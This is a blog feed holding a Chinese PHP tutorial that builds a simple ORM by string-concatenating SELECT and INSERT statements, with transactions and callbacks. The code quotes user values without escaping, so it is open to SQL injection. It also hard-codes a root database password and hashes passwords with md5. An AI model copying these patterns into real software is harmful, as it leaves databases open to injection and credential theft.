<span class="keyword">$this</span>-&gt;db=<span class="keyword">new</span> PDO(<span class="string">"mysql:host=127.0.0.1;dbname=testOrm"</span>,<span class="string">"root"</span>,<span class="string">"hello2016"</span>);<span class="comment">//初始化数据库连接</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $fields=func_get_args();</span><br><span class="line">        <span class="keyword">foreach</span> ($fields <span class="keyword">as</span> $field) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($field)) &#123;</span><br><span class="line">                $get_key=key($field);<span class="comment">//获取数组的key，其实就是表的名字，还需要在字段前面加上表前缀</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;__add(<span class="keyword">__FUNCTION__</span>, <span class="keyword">$this</span>-&gt;_aliastb($get_key).<span class="string">'.'</span>.$field[$get_key]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;__add(<span class="keyword">__FUNCTION__</span>, $field);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//插入数据</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $params=func_get_args();<span class="comment">//获取可变参数</span></span><br><span class="line">        $fields=[];</span><br><span class="line">        $fields_values=[];</span><br><span class="line">        $callback=[];</span><br><span class="line">        <span class="keyword">foreach</span> ($params <span class="keyword">as</span> $param) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array($param)) &#123;<span class="comment">//代表要拼接的是字段和值</span></span><br><span class="line">                <span class="keyword">foreach</span> ($param <span class="keyword">as</span> $item) &#123;</span><br><span class="line">                    <span class="comment">//取出字段名</span></span><br><span class="line">                    $field=key($item);</span><br><span class="line">                    <span class="comment">//取出字段的值</span></span><br><span class="line">                    $field_value=$item[$field];</span><br><span class="line"></span><br><span class="line">                    <span class="comment">//把上面的字段和字段值插入相对应的数组</span></span><br><span class="line">                    $fields[]=$field;</span><br><span class="line">                    <span class="comment">//拼凑字符串的时候，判断是否是字符串，如果是字符串则要加上单引号</span></span><br><span class="line">                    <span class="keyword">if</span> (is_string($field_value)) &#123;</span><br><span class="line">                        $field_value=<span class="string">"'"</span>.$field_value.<span class="string">"'"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    $fields_values[]=$field_value;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//处理完参数之后，构造要插入字段的拼凑</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;__add(<span class="string">"insertfields"</span>, <span class="string">'('</span>.implode($fields,<span class="string">','</span>).<span class="string">')'</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;__add(<span class="string">"values"</span>, <span class="string">'('</span>.implode($fields_values,<span class="string">','</span>).<span class="string">')'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果是字符串说明传的是表名</span></span><br><span class="line">            <span class="keyword">if</span> (is_string($param)) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;__add(<span class="string">"insertinto"</span>, $param);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(is_bool($param) &amp;&amp; $param) <span class="comment">//如果传过来的参数是 布尔型，且为true,则默认开启事务</span></span><br><span class="line">            &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">$this</span>-&gt;db-&gt;beginTransaction();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (is_callable($param)) &#123;</span><br><span class="line">                $callback[]=$param;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(count($callback)&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;exec();<span class="comment">//如果有匿名函数，则先执行SQL</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;clearConfig();  <span class="comment">//恢复配置到最开始状态，防止执行其他SQL时产生冲突。大家可以把SQL保存到 某个类属性中</span></span><br><span class="line">            <span class="keyword">foreach</span>($callback <span class="keyword">as</span> $call)<span class="comment">//最后统一执行各个回调函数</span></span><br><span class="line">            &#123;</span><br><span class="line">                $call=Closure::bind($call,<span class="keyword">$this</span>);<span class="comment">//这样在匿名函数中就可以使用$this ,且这个$this就是orm对象</span></span><br><span class="line">                $call();<span class="comment">//手工调用 匿名函数，这就是回调</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//避免sql语句相互干扰</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span><span class="params">()</span>//恢复到原有配置</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">$this</span>-&gt;sql_bak;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//排序</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">orderby</span><span class="params">($str, $order)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $order=<span class="string">' '</span>.$order;</span><br><span class="line">        <span class="keyword">if</span> (is_array($str)) &#123;</span><br><span class="line">            $tb=key($str);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__add(<span class="keyword">__FUNCTION__</span>, <span class="keyword">$this</span>-&gt;_aliastb($tb).<span class="string">'.'</span>.$str[$tb].$order);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__add(<span class="keyword">__FUNCTION__</span>, $str.$order);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//给表加别名</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_aliastb</span><span class="params">($tbName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">' _'</span>.$tbName;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">from</span><span class="params">($tableName)</span>//处理<span class="title">from</span>过程</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_array($tableName)) &#123;<span class="comment">//是数组的话就是代表多张表关联</span></span><br><span class="line">            <span class="keyword">if</span> (count($tableName)!=<span class="number">2</span>) <span class="keyword">return</span> <span class="keyword">$this</span>;<span class="comment">//参数值类似[["name"=&gt;classid""],["name_class"]=&gt;"id"],小于2灭有意义</span></span><br><span class="line">            $tb1=current($tableName);</span><br><span class="line">            $tb2=next($tableName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//第一步，把表的key值作为from参数进行处理</span></span><br><span class="line">            $tb1_key=key($tb1);</span><br><span class="line">            $tb1_value=$tb1[$tb1_key];</span><br><span class="line"></span><br><span class="line">            $tb2_key=key($tb2);</span><br><span class="line">            $tb2_value=$tb2[$tb2_key];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;__add(<span class="keyword">__FUNCTION__</span>, $tb1_key);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__add(<span class="keyword">__FUNCTION__</span>, $tb2_key);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//第二步，拼凑where条件</span></span><br><span class="line">            $whereString=<span class="string">' _'</span>.$tb1_key.<span class="string">'.'</span>.$tb1_value.<span class="string">'='</span>.<span class="string">"_"</span>.$tb2_key.<span class="string">'.'</span>.$tb2_value;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;where($whereString);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">//字符串则表示单张表查询</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;__add(<span class="keyword">__FUNCTION__</span>, $tableName);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">where</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__add(<span class="keyword">__FUNCTION__</span>, $str, <span class="string">" and "</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__add</span><span class="params">($key,  $str,  $spliter=<span class="string">","</span>)</span>//实现字符串的累加</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//调用不存在的方法，直接返回</span></span><br><span class="line">        <span class="keyword">if</span>(!array_key_exists($key, <span class="keyword">$this</span>-&gt;sql))   <span class="keyword">return</span> ;</span><br><span class="line">        <span class="keyword">if</span> (is_array(<span class="keyword">$this</span>-&gt;sql[$key])) &#123;</span><br><span class="line">            <span class="comment">//如果已经存在该项表明我们不做什么处理</span></span><br><span class="line">            <span class="keyword">if</span> (!in_array($str, <span class="keyword">$this</span>-&gt;sql[$key][<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;sql[$key][<span class="number">1</span>][]=$str;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//如果是字符串，直接进行字符串累加</span></span><br><span class="line"><span class="comment">//            if (trim($this-&gt;sql[$key])!=$key)</span></span><br><span class="line">            <span class="keyword">if</span> (preg_replace(<span class="string">'/\s/'</span>, <span class="string">''</span>, <span class="keyword">$this</span>-&gt;sql[$key])!=$key &amp;&amp; preg_replace(<span class="string">"/\s/"</span>, <span class="string">''</span>, <span class="keyword">$this</span>-&gt;sql[$key])!=<span class="string">""</span>)</span><br><span class="line">                <span class="keyword">$this</span>-&gt;sql[$key].=$spliter;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;sql[$key].=$str;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $map;</span><br><span class="line"></span><br><span class="line">        $map=Closure::bind($map ,<span class="keyword">$this</span>);</span><br><span class="line">        <span class="comment">//</span></span><br><span class="line">        $filter=<span class="function"><span class="keyword">function</span> <span class="params">($value, $key)</span> </span>&#123;</span><br><span class="line"><span class="comment">//            if(!is_string($value)) return true;</span></span><br><span class="line">            <span class="keyword">if</span>(is_array($value)) &#123;</span><br><span class="line">                <span class="keyword">if</span>(count($value[<span class="number">1</span>])&gt;<span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果是空字符串也不参与累加</span></span><br><span class="line">            <span class="keyword">if</span>(preg_replace(<span class="string">"/\s/"</span>, <span class="string">''</span>, $value)==$key || preg_replace(<span class="string">"/\s/"</span>, <span class="string">""</span>, $value )==<span class="string">""</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql=array_filter(<span class="keyword">$this</span>-&gt;sql, $filter, ARRAY_FILTER_USE_BOTH );</span><br><span class="line">        $res=array_map($map, array_values(<span class="keyword">$this</span>-&gt;sql));<span class="comment">//</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;sql=<span class="keyword">$this</span>-&gt;sql_bak;</span><br><span class="line">        <span class="keyword">return</span> implode(array_values($res), <span class="string">' '</span>);<span class="comment">//把新的数组重新构建成一个字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//测试执行方法</span></span><br><span class="line">        $sql=strval(<span class="keyword">$this</span>); <span class="comment">//会自动调用 _tostring方法</span></span><br><span class="line"></span><br><span class="line">        $stmt=<span class="keyword">$this</span>-&gt;db-&gt;prepare($sql);</span><br><span class="line">        <span class="keyword">if</span>(!$stmt-&gt;execute())<span class="comment">//执行失败，</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;db-&gt;inTransaction()) <span class="comment">//判断是否开启了事务</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;db-&gt;rollBack();<span class="comment">//执行回滚</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;errorCode=$stmt-&gt;errorCode();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"执行Sql"</span>.$sql.<span class="string">'出错,错误代码:'</span>.<span class="keyword">$this</span>-&gt;errorCode.<span class="string">"，错误信息:"</span>.$stmt-&gt;errorInfo()[<span class="number">2</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getLastInsertID</span><span class="params">()</span> //获取上一条<span class="title">SQL</span>执行情况</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;lastInsertId();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getAll</span><span class="params">()</span> //获取全部取出的结果</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;db-&gt;fetchAll();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">commit</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">//提交事务</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;db-&gt;inTransaction())</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db-&gt;commit();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    $orm=<span class="keyword">new</span> orm();</span><br><span class="line">    <span class="keyword">echo</span> $orm-&gt;insert(<span class="keyword">true</span>,[</span><br><span class="line">        [<span class="string">'user_name'</span>=&gt;<span class="string">"seven"</span>],</span><br><span class="line">        [<span class="string">'user_pwd'</span>=&gt;md5(<span class="string">'123'</span>)]</span><br><span class="line">    ],<span class="string">"user"</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $userid=<span class="keyword">$this</span>-&gt;getLastInsertID(); <span class="comment">//获取用户注册后的自增ID</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;insert([</span><br><span class="line">            [<span class="string">'user_id'</span>=&gt;intval($userid)],</span><br><span class="line">            [<span class="string">'order_price'</span>=&gt;<span class="number">100</span>],</span><br><span class="line">        ],<span class="string">"orders"</span>,<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;errorCode==<span class="string">""</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;commit();</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"sucess!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"fail!"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> php </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>php折腾模拟实现ORM-1</title>
      <link href="/2017/08/12/php%E6%8A%98%E8%85%BE%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0ORM-1/"/>
      <url>/2017/08/12/php%E6%8A%98%E8%85%BE%E6%A8%A1%E6%8B%9F%E5%AE%9E%E7%8E%B0ORM-1/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><strong>前言</strong></h2><p>早先接触编程的时候，虽然也接触不久（捂脸）一开始原生的sql还不熟练，做项目的时候开始直接使用，导致一开始就对整个sql认识有点偏差，实在是害人不浅，不过学到后面才慢慢开始脱离这个坑，很多东西，比如说框架什么的，我们如果只会用，对原理不理解而且也不想去理解，那么编程这一条会越走越窄的，回归正题，orm，相信大家应该平时开发项目的时候都有用过，比如php laravel框架的orm或者java spring的orm框架，对orm的有点总结的话，有以下几点:</p><ol><li>orm是一种工具，工具确实能解决一些重复，简单的劳动</li><li>隐藏了数据访问细节，使得我们的通用数据库交互变得简单易行，完全不用使用复杂的sql语句，只使用orm提供的面向对象的方法对数据进行增删查改</li><li>然而，对于复杂查询的话，orm还是远远不能满足的，最近在做一个报表项目，发现orm真的是没法很好的表达出来，还是写原生比较舒服点</li><li>效率，因为要执行各种匹配，肯定牺牲一定的效率，但目前有缓存和懒加载什么的，感觉效率无可挑剔</li></ol><h2 id="折腾（一）-SQL的拼凑"><a href="#折腾（一）-SQL的拼凑" class="headerlink" title="折腾（一）-SQL的拼凑"></a><strong>折腾（一）-SQL的拼凑</strong></h2><p>orm的主体就是字符串的拼凑，把用户输入的参数拼凑成sql语句，下面代码实现了常见的select， where order by 以及insert，其中where实现了多表查询<br>查询语句如下所示</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$orm</span>=new orm();</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$orm</span>-&gt;select([<span class="string">"name"</span>=&gt;<span class="string">"classid"</span>],<span class="string">'uname'</span>,<span class="string">'user'</span>)</span><br><span class="line">         -&gt;from([[<span class="string">"name"</span>=&gt;<span class="string">"classid"</span>], [<span class="string">"name_class"</span>=&gt;<span class="string">"id"</span>]])</span><br><span class="line">         -&gt;from([[<span class="string">"name"</span>=&gt;<span class="string">"classid"</span>], [<span class="string">"name_class"</span>=&gt;<span class="string">"id"</span>]]&gt;orderby([<span class="string">"class"</span>=&gt;<span class="string">"id"</span>],<span class="string">"desc"</span>);</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$orm</span>-&gt;insert([</span><br><span class="line">        [<span class="string">"id"</span>=&gt;<span class="string">'123'</span>],</span><br><span class="line">        [<span class="string">"name"</span>=&gt;<span class="string">"seven"</span>]</span><br><span class="line">    ],<span class="string">"news"</span>,<span class="keyword">function</span> (<span class="variable">$orm</span>) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">"hello world!"</span>;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><p>拼凑效果如下所示:<br><img src="http://img.blog.csdn.net/20170812222113749?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvc2V2ZW5fMjAxNg==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/SouthEast" alt="这里写图片描述"><br>其中hello world，是回调函数输出的，我们可以使用回调更方便的执行的业务代码，这里只是学习模拟我们js的回调函数，其实php也可以回调的。</p><p>拼凑代码如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(<span class="string">'display_errors'</span>,1);</span><br><span class="line">ini_set(<span class="string">'error_reporting'</span>,E_ALL);</span><br><span class="line"></span><br><span class="line"><span class="variable">$map</span>=<span class="keyword">function</span> (<span class="variable">$items</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!is_array(<span class="variable">$items</span>)) &#123;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$items</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$result</span>=<span class="string">""</span>;</span><br><span class="line">        foreach (<span class="variable">$items</span>[1] as <span class="variable">$item</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span>!=<span class="string">""</span>)</span><br><span class="line">                <span class="variable">$result</span>.=<span class="string">","</span>;</span><br><span class="line">            <span class="variable">$result</span>.=<span class="variable">$item</span>.<span class="variable">$this</span>-&gt;_aliastb(<span class="variable">$item</span>);//类似news,news_class 添加到form后面</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$items</span>[0].<span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">class orm</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$sql</span>=array(</span><br><span class="line">        <span class="string">"select"</span>=&gt;<span class="string">"select "</span>,</span><br><span class="line">        <span class="string">"from"</span>=&gt;array(<span class="string">"from "</span>,array()),</span><br><span class="line">        <span class="string">"where"</span>=&gt;<span class="string">" where "</span>,</span><br><span class="line">        <span class="string">"orderby"</span>=&gt;<span class="string">" order by "</span>,</span><br><span class="line">        <span class="string">"insertinto"</span>=&gt;<span class="string">"insert into "</span>,//insert操作</span><br><span class="line">        <span class="string">"insertfields"</span>=&gt;<span class="string">""</span>,</span><br><span class="line">        <span class="string">"values"</span>=&gt;<span class="string">" values"</span></span><br><span class="line">    );</span><br><span class="line">    public <span class="variable">$sql_bak</span>=[];</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;sql_bak=<span class="variable">$this</span>-&gt;sql;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public <span class="keyword">function</span> select()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fields</span>=func_get_args();</span><br><span class="line">        foreach (<span class="variable">$fields</span> as <span class="variable">$field</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$field</span>)) &#123;</span><br><span class="line">                <span class="variable">$get_key</span>=key(<span class="variable">$field</span>);//获取数组的key，其实就是表的名字，还需要在字段前面加上表前缀</span><br><span class="line">                <span class="variable">$this</span>-&gt;__add(__FUNCTION__, <span class="variable">$this</span>-&gt;_aliastb(<span class="variable">$get_key</span>).<span class="string">'.'</span>.<span class="variable">$field</span>[<span class="variable">$get_key</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$this</span>-&gt;__add(__FUNCTION__, <span class="variable">$field</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    //插入数据</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">insert</span></span>() &#123;</span><br><span class="line">        <span class="variable">$params</span>=func_get_args();//获取可变参数</span><br><span class="line">        <span class="variable">$fields</span>=[];</span><br><span class="line">        <span class="variable">$fields_values</span>=[];</span><br><span class="line">        <span class="variable">$callback</span>=[];</span><br><span class="line">        foreach (<span class="variable">$params</span> as <span class="variable">$param</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (is_array(<span class="variable">$param</span>)) &#123;//代表要拼接的是字段和值</span><br><span class="line">                foreach (<span class="variable">$param</span> as <span class="variable">$item</span>) &#123;</span><br><span class="line">                    //取出字段名</span><br><span class="line">                    <span class="variable">$field</span>=key(<span class="variable">$item</span>);</span><br><span class="line">                    //取出字段的值</span><br><span class="line">                    <span class="variable">$field_value</span>=<span class="variable">$item</span>[<span class="variable">$field</span>];</span><br><span class="line"></span><br><span class="line">                    //把上面的字段和字段值插入相对应的数组</span><br><span class="line">                    <span class="variable">$fields</span>[]=<span class="variable">$field</span>;</span><br><span class="line">                    //拼凑字符串的时候，判断是否是字符串，如果是字符串则要加上单引号</span><br><span class="line">                    <span class="keyword">if</span> (is_string(<span class="variable">$field_value</span>)) &#123;</span><br><span class="line">                        <span class="variable">$field_value</span>=<span class="string">"'"</span>.<span class="variable">$field_value</span>.<span class="string">"'"</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$fields_values</span>[]=<span class="variable">$field_value</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                //处理完参数之后，构造要插入字段的拼凑</span><br><span class="line">                <span class="variable">$this</span>-&gt;__add(<span class="string">"insertfields"</span>, <span class="string">'('</span>.implode(<span class="variable">$fields</span>,<span class="string">','</span>).<span class="string">')'</span>);</span><br><span class="line">                <span class="variable">$this</span>-&gt;__add(<span class="string">"values"</span>, <span class="string">'('</span>.implode(<span class="variable">$fields_values</span>,<span class="string">','</span>).<span 